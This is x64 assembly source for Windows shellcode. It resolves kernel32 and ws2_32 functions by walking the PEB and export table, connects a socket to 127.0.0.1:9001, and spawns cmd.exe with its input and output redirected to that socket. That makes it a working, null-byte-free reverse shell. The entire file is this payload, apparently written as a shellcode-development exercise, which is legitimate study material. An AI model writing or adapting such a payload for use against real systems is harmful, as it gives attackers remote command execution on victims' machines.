BITS 64
SECTION .text
global main
main:
sub rsp, 0x28                       ; stack alignment
and rsp, 0xFFFFFFFFFFFFFFF0         ; stack alignment
xor rcx, rcx                        ; RCX = 0
mov rax, [gs:rcx + 0x60]            ; RAX = PEB
mov rax, [rax + 0x18]               ; RAX = PEB->Ldr
mov rsi,[rax+0x10]                  ; PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]                 ; kernel32.dll base address
mov r8, rbx                         ; mov kernel32.dll base addr into r8
mov ebx, [rbx+0x3C]                 ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                         ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                        ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff                      ; cx is the lower 16 bit portion of ecx (32 bit), and rcx is 64 bit.
shr rcx, 0x8                        ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]                  ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                         ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]                ; Number of functions
xor r11, r11                        ; Zero R11 before use
mov r11d, [rdx+0x20]                ; AddressOfNames RVA
add r11, r8                         ; AddressOfNames VMA
mov rcx, r10                        ; store number of functions for future use
mov rax, 0x9090737365726464         ; 'ddress'
shl rax, 0x10                       ; 7373657264640000
shr rax, 0x10                       ; 0000737365726464 terminate our string w/ no nulls present in our shellcode!
push rax
mov rax, 0x41636F7250746547         ; 'GetProcA '
push rax
mov rax, rsp	
findfunction:                       ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound      ; Loop around this function until we find WinExec
    xor ebx,ebx                     ; Zero EBX for use
    mov ebx, [r11+rcx*4]            ; EBX = RVA for first AddressOfName
    add rbx, r8                     ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                         ; Decrement our loop by one, this goes from Z to A
    ; Load first 8 bytes of "GetProcA"
    mov r9, qword [rax]             ; R9 = "GetProcA"
    cmp [rbx], r9                   ; Compare first 8 bytes
    jnz findfunction                ; If not equal, continue loop
    ; Check next part for "ddress" (4 bytes)
    mov r9d, dword [rax + 8]        ; R9 = "ddress"
    cmp [rbx + 8], r9d              ; Compare remaining part
    jz FunctionNameFound            ; If match, function found
	jnz findfunction
FunctionNameNotFound:
    int3
FunctionNameFound:
    push rcx
    pop r15                         ; GetProcAddress position in Function Names
    inc r15   
    xor r11, r11
    mov r11d, [rdx+0x1c]            ; AddressOfFunctions RVA
    add r11, r8                     ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
    mov eax, [r11+r15*4]            ; Get the function RVA.
    add rax, r8                     ; Found the GetProcAddress WinApi!!!
	push rax                        ; push GetProcAddress temporarily to be used by next segment
; Prepare arguments for getting handle to LoadLibraryA:
    pop r15                         ; temporary use
    mov r12, r15                    ; save copy of GetProcAddress for future use
    mov rdi, r8                     ; make a copy of kernel32 base address for future use
    mov rcx, r8                     ; RCX = handle to kernel32.dll (first argument)
; Load "LoadLibraryA" onto the stack
    mov rax, 0x41797261             ; aryA, 0 (include null byte)
    push rax
    mov rax, 0x7262694C64616F4C     ; LoadLibr 
    push rax
    mov rdx, rsp	                ; RDX points to "LoadLibraryA" (second argument)
    sub rsp, 0x30                   ; decimal 48 ( 3 x 16 bytes)
    call r15                        ; Call GetProcAddress
    add rsp, 0x30
    mov r15, rax                    ; holds LoadLibraryA!
	
	;Okay, let's make some notes on our current register values
	;==========================================================
	;r15 = LoadLibraryA
	;rdi = Kernel32
	;r12 = GetProcAddress
	
	;exitprocess
    mov r9, r12                      ; r9 temporarily holds GetProcAddress handle
    mov rcx, rdi                     ; RCX = handle to kernel32.dll (first argument)
    ; Load "ExitProcess" onto the stack
    mov rax, 0x90737365              ; 'ess'
    shl eax, 0x8                     ; 0000000073736500
    shr eax, 0x8                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
    push rax
    mov rax, 0x636F725074697845      ; ExitProc 
    push rax
    mov rdx, rsp	                 ; RDX points to "ExitProcess" (second argument)
    sub rsp, 0x30
    call r9                          ; Call GetProcAddress
    add rsp, 0x30
    mov rbx, rax                     ; RBX holds ExitProcess!
	;CreateProcessA
    mov r9, r12                      ; r9 temporarily holds GetProcAddress handle
    mov rcx, rdi                     ; RCX = handle to kernel32.dll (first argument)
    ; Load "CreateProcessA" onto the stack
    mov rax, 0x909041737365636F              ; 'ocessA'
    shl rax, 0x10                     ; 0000000073736500
    shr rax, 0x10                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
    push rax
    mov rax, 0x7250657461657243      ; CreatePr 
    push rax
    mov rdx, rsp	                 ; RDX points to "CreateProcessA" (second argument)
    sub rsp, 0x30
    call r9                          ; Call GetProcAddress
    add rsp, 0x30
    mov r13, rax                     ; r13 holds CreateProcessA!
	;ws2_32.dll
    mov rax, 0x90906C6C              ; add "ll" string to RAX
    shl eax, 0x10                    ; 000000006C6C0000
    shr eax, 0x10                    ; 0000000000006C6C
    push rax                         ; push RAX to stack
    mov rax, 0x642E32335F327377      ; Add "ws2_32.d" string to RAX.
    push rax                         ; Push RAX to stack
    mov rcx, rsp                     ; Move a pointer to ws2_32.dll into RCX.
    sub rsp, 0x30
    call r15                         ; Call LoadLibraryA("ws2_32.dll")
    mov r14, rax                     ; holds ws2_32.dll address!!!
	; Prepare arguments for GetProcAddress to load WSAStartup using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90907075              ; Load "up" into RAX
    shl eax, 0x10                     ; 0000000041786F00
    shr eax, 0x10                     ; 000000000041786F
    push rax
    mov rax, 0x7472617453415357      ; Load "WSAStart" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSAStartup" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov r15, rax                     ; Got WSAStartup!  Let's store it
	; Prepare arguments for GetProcAddress to load WSASocketA using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90904174              ; Load "tA" into RAX
    shl eax, 0x10                     ; 0000000041786F00
    shr eax, 0x10                     ; 000000000041786F
    push rax
    mov rax, 0x656B636F53415357      ; Load "WSASocke" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSASocketA" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov rsi, rax                     ; Got WSASocketA!  Let's store it
	; Prepare arguments for GetProcAddress to load WSAConnect using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90907463              ; Load "ct" into RAX
    shl eax, 0x10                     ; 0000000041786F00
    shr eax, 0x10                     ; 000000000041786F
    push rax
    mov rax, 0x656E6E6F43415357      ; Load "WSAConne" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSAConnect" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov rdi, rax                     ; Got WSAConnect!  Let's store it
	
	mov r14, r13                     ; move CreateProcessA out of r13 into r14 for later use
	
	;Update #2 - register values
	;===========================
	;rbx = ExitProcess
	;r12 = GetProcAddress
	;r14 = CreateProcessA
	;r14 = ws2_32
	;r15 = WSAStartup
	;rsi = WSASocketA
	;rdi = WSAConnect
	
	; Call WSAStartup
	;and rsp, 0xFFFFFFFFFFFFFFF0
    xor rcx, rcx
    mov cx, 0x198               ; Defines the size of the buffer that will be allocated on the stack to hold the WSADATA structure
    sub rsp, rcx                ; Reserve space for lpWSDATA structure
    lea rdx, [rsp]              ; Assign address of lpWSAData to RDX - 2nd param
    mov cx, 0x202               ; Assign 0x202 to wVersionRequired as 1st parameter
    sub rsp, 0x28               ; stack alignment
    call r15                    ; Call WSAStartup
    add rsp, 0x30               ; stack alignment
    ; Create a socket 
    xor rcx, rcx           
    mov cl, 2                   ; AF = 2 - 1st param
    xor rdx, rdx          
    mov dl, 1                   ; Type = 1 - 2nd param
    xor r8, r8              
    mov r8b, 6                  ; Protocol = 6 - 3rd param
    xor r9, r9                  ; lpProtocolInfo = 0 - fourth param
    mov [rsp+0x20], r9          ; 0 = 5th param
    mov [rsp+0x28], r9          ; 0 = 6th param
    call rsi                    ; Call WSASocketA 
    mov r12, rax                ; Save the returned socket value
    add rsp, 0x30           
    ; Initiate Socket Connection
    mov r13, rax                ; Store SOCKET handle in r13 for future needs
    mov rcx, r13                ; Our socket handle as parameter 1
    xor rax,rax                 ; rax = 0
    inc rax                     ; rax = 1
    inc rax                     ; rax = 2
    mov [rsp], rax              ; AF_INET = 2
    mov ax, 0x2923              ; Port 9001
    mov [rsp+2], ax             ; our Port
    ;mov rax, 0x0100007F        ; IP 127.0.0.1 (I use virtual box with port forwarding, hence the localhost addr)
	mov rax, 0xFFFFFFFFFEFFFF80 ; 127.0.0.1 encoded with NOT to avoid NULLs
	not rax                     ; decoded value
    mov [rsp+4], rax            ; our IP
    lea rdx,[rsp]               ; Save pointer to RDX
    mov r8b, 0x16               ; Move 0x10 (decimal 16) to namelen
    xor r9,r9             
    push r9                     ; NULL
    push r9                     ; NULL 
    push r9                     ; NULL 
	add rsp, 8
    sub rsp, 0x60               ; This is somewhat problematic. needs to be a high value to account for the values pushed to the stack
	sub rsp, 0x60               ; in short, making space on the stack for stuff to get populated after executing WSAConnect
    call rdi                    ; Call WSAConnect
	;prepare for CreateProcessA
    add rsp, 0x30
	mov rax, 0xFF9A879AD19B929C  ; encode cmd.exe using NOT to remove NULL bytes
	not rax                      ; decode cmd.exe
    push rax                      
    mov rcx, rsp                ; RCX = lpApplicationName (cmd.exe)
    ; STARTUPINFOA Structure (I despise this thing)
	; https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    push r13                    ; Push STDERROR
    push r13                    ; Push STDOUTPUT
    push r13                    ; Push STDINPUT
    xor rax,rax
    push rax                    ; 8 bytes -> push lpReserved2
    push rax                    ; 8 bytes -> combine cbReserved2 and wShowWindow
    push ax                     ; dwFlags 4 bytes total, first 2 bytes
    mov al, 0x1                 ; STARTF_USESTDHANDLES
	shl eax, 0x8                ; = 0x100 and removes NULL bytes!
    push ax                     ; continuation of the above, last 2 bytes for dwFlags
    xor rax,rax  
    push rax                    ; dwFillAttribute (4 bytes) + dwYCountChars (4 bytes)
    push rax                    ; dwXCountChars (4 bytes) + dwYSize (4 bytes)
    push rax                    ; dwXSize (4 bytes) + dwY (4 bytes)
    push ax                     ; dwX 4 bytes total, first 2 bytes
	push ax                     ; dwX last 2 bytes
	push rax                    ; 8 bytes -> lpTitle
    push rax                    ; 8 bytes -> lpDesktop = NULL
    push rax                    ; 8 bytes -> lpReserved = NULL
    mov al, 0x68                ; total size of structure.  Move it into AL to avoid NULLs
    push rax                    
    mov rdi,rsp                 ; Copy the pointer to the structure to RDI
    ; Call CreateProcessA
    mov rax, rsp                ; Get current stack pointer
    sub ax, 0x4FF               ; Setup space on the stack for holding process info
	dec ax                      ; we're subtracting 0x500 in total but we do it this way to avoid nulls
    push rax                    ; ProcessInfo
    push rdi                    ; StartupInfo -> Pointer to STARTUPINFOA
    xor rax, rax
    push rax                    ; lpCurrentDirectory
    push rax                    ; lpEnvironment
    push rax                   
    inc rax
    push rax                    ; bInheritHandles -> 1
    xor rax, rax
    push rax                    ; hStdInput = NULL
    push rax                    ; hStdOutput = NULL
    push rax                    ; hStdError = NULL
    push rax                    ; dwCreationFlags
    mov r8, rax                 ; lpThreadAttributes            
    mov r9, rax                 ; lpProcessAttributes           
    mov rdx, rcx                ; lpCommandLine = "cmd.exe" 
    mov rcx, rax                ; lpApplicationName              
    call r14                    ; Call CreateProcessA
    ; Clean exit
    xor rcx, rcx                ; move 0 into RCX = 1st parameter
    call rbx                    ; Call ExitProcess
